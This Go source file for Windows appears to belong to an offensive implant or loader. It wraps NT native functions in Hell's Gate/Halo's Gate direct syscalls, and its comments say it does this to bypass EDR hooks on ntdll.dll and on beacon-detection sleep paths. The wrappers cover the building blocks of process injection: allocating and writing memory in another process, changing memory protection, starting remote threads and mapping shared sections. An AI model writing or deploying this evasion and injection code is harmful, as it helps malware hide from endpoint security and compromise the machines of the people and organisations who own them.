//go:build windows

package main

// NT native API wrappers using Hell's Gate direct syscalls.
//
// All functions resolve the syscall number via the PEB export table walk
// (Hell's Gate + Halo's Gate fallback) and issue the syscall instruction
// directly — bypassing any userland hooks EDRs place on ntdll.dll stubs.
//
// Naming convention: nt<Name> mirrors the NT function name.

import (
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	ntCurrentProcess uintptr = ^uintptr(0)     // (HANDLE)-1
	ntCurrentThread  uintptr = ^uintptr(0) - 1 // (HANDLE)-2
	memCommitReserve uintptr = 0x3000           // MEM_COMMIT | MEM_RESERVE
	memReleaseFl     uintptr = 0x8000           // MEM_RELEASE
)

// ─── Memory allocation ───────────────────────────────────────────────────────

// ntAlloc allocates size bytes in hProc with the given protection flags.
// Returns the base address of the allocated region.
func ntAlloc(hProc windows.Handle, size uintptr, protect uint32) (uintptr, error) {
	base := uintptr(0)
	sz := size
	_, err := HellsGateCall("NtAllocateVirtualMemory",
		uintptr(hProc),
		uintptr(unsafe.Pointer(&base)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(&sz)),
		memCommitReserve,
		uintptr(protect),
	)
	if err != nil {
		return 0, fmt.Errorf("ntAlloc: %w", err)
	}
	return base, nil
}

// ntAllocAt tries to allocate at preferredBase first; falls back to OS-chosen
// address if the preferred base is unavailable.
func ntAllocAt(hProc windows.Handle, preferredBase, size uintptr, protect uint32) (uintptr, error) {
	base := preferredBase
	sz := size
	_, err := HellsGateCall("NtAllocateVirtualMemory",
		uintptr(hProc),
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&sz)),
		memCommitReserve,
		uintptr(protect),
	)
	if err != nil {
		// Preferred base unavailable — let OS choose.
		return ntAlloc(hProc, size, protect)
	}
	return base, nil
}

// ntFree releases a region allocated with ntAlloc. Non-fatal: errors are discarded.
func ntFree(hProc windows.Handle, base uintptr) {
	sz := uintptr(0)
	HellsGateCall("NtFreeVirtualMemory", //nolint:errcheck
		uintptr(hProc),
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		memReleaseFl,
	)
}

// ─── Memory write ─────────────────────────────────────────────────────────────

// ntWrite writes data into addr in hProc.
func ntWrite(hProc windows.Handle, addr uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	var written uintptr
	_, err := HellsGateCall("NtWriteVirtualMemory",
		uintptr(hProc),
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if err != nil {
		return fmt.Errorf("ntWrite: %w", err)
	}
	return nil
}

// ─── Memory protection ───────────────────────────────────────────────────────

// ntProtect changes the memory protection on addr..addr+size in hProc.
// Returns the previous protection value.
func ntProtect(hProc windows.Handle, addr, size uintptr, newProtect uint32) (uint32, error) {
	base := addr
	sz := size
	var old uint32
	_, err := HellsGateCall("NtProtectVirtualMemory",
		uintptr(hProc),
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&old)),
	)
	if err != nil {
		return 0, fmt.Errorf("ntProtect: %w", err)
	}
	return old, nil
}

// ntProtectSelf is ntProtect for the current process (no handle needed).
func ntProtectSelf(addr, size uintptr, protect uint32) (uint32, error) {
	return ntProtect(windows.Handle(ntCurrentProcess), addr, size, protect)
}

// ─── Thread creation ─────────────────────────────────────────────────────────

// ntCreateThread starts a new thread in hProc at startAddr.
// Returns the thread handle (caller must CloseHandle when done).
func ntCreateThread(hProc windows.Handle, startAddr uintptr) (windows.Handle, error) {
	var hThread uintptr
	_, err := HellsGateCall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,        // ObjectAttributes (NULL = default)
		uintptr(hProc),
		startAddr,
		0, // lpParameter (NULL)
		0, // Flags: 0 = run immediately, 1 = CREATE_SUSPENDED
		0, // StackZeroBits
		0, // SizeOfStackCommit (0 = default)
		0, // SizeOfStackReserve (0 = default)
		0, // lpBytesBuffer (NULL)
	)
	if err != nil {
		return 0, fmt.Errorf("ntCreateThread: %w", err)
	}
	return windows.Handle(hThread), nil
}

// ─── Section / view mapping ──────────────────────────────────────────────────

// ntCreateSec creates a pagefile-backed anonymous section of size bytes.
// sectionProtect controls the maximum protection (e.g. PAGE_EXECUTE_READWRITE).
func ntCreateSec(size uintptr, sectionProtect uint32) (windows.Handle, error) {
	var hSection uintptr
	// MaximumSize is PLARGE_INTEGER — use int64 to match 8-byte signed field.
	maxSize := int64(size)
	_, err := HellsGateCall("NtCreateSection",
		uintptr(unsafe.Pointer(&hSection)),
		0xF001F, // SECTION_ALL_ACCESS
		0,       // ObjectAttributes (NULL)
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(sectionProtect),
		uintptr(secCommit), // SEC_COMMIT = 0x8000000 (from mapinject_windows.go)
		0,                  // FileHandle (NULL = pagefile-backed)
	)
	if err != nil {
		return 0, fmt.Errorf("ntCreateSec: %w", err)
	}
	return windows.Handle(hSection), nil
}

// ntMapView maps hSection into hProc with the given protection and returns the base.
// size=0 maps the entire section.
func ntMapView(hSection, hProc windows.Handle, size uintptr, protect uint32) (uintptr, error) {
	base := uintptr(0)
	viewSz := size
	_, err := HellsGateCall("NtMapViewOfSection",
		uintptr(hSection),
		uintptr(hProc),
		uintptr(unsafe.Pointer(&base)),
		0, // ZeroBits
		0, // CommitSize
		0, // SectionOffset (NULL = beginning)
		uintptr(unsafe.Pointer(&viewSz)),
		uintptr(viewShare), // InheritDisposition = ViewShare (from mapinject_windows.go)
		0,                  // AllocationType
		uintptr(protect),
	)
	if err != nil {
		return 0, fmt.Errorf("ntMapView: %w", err)
	}
	return base, nil
}

// ntUnmap unmaps the view at base from hProc. Non-fatal.
func ntUnmap(hProc windows.Handle, base uintptr) {
	HellsGateCall("NtUnmapViewOfSection", uintptr(hProc), base) //nolint:errcheck
}

// ─── Sleep ───────────────────────────────────────────────────────────────────

// ntDelay sleeps for d using NtDelayExecution (direct syscall — avoids the
// hooked Sleep/SleepEx path that some EDRs instrument for beacon detection).
// Falls back to time.Sleep if the syscall fails.
func ntDelay(d time.Duration) {
	// NtDelayExecution interval is in 100-nanosecond units, negative = relative.
	interval := -int64(d / 100)
	_, err := HellsGateCall("NtDelayExecution",
		0, // Alertable = FALSE
		uintptr(unsafe.Pointer(&interval)),
	)
	if err != nil {
		time.Sleep(d) // fallback
	}
}
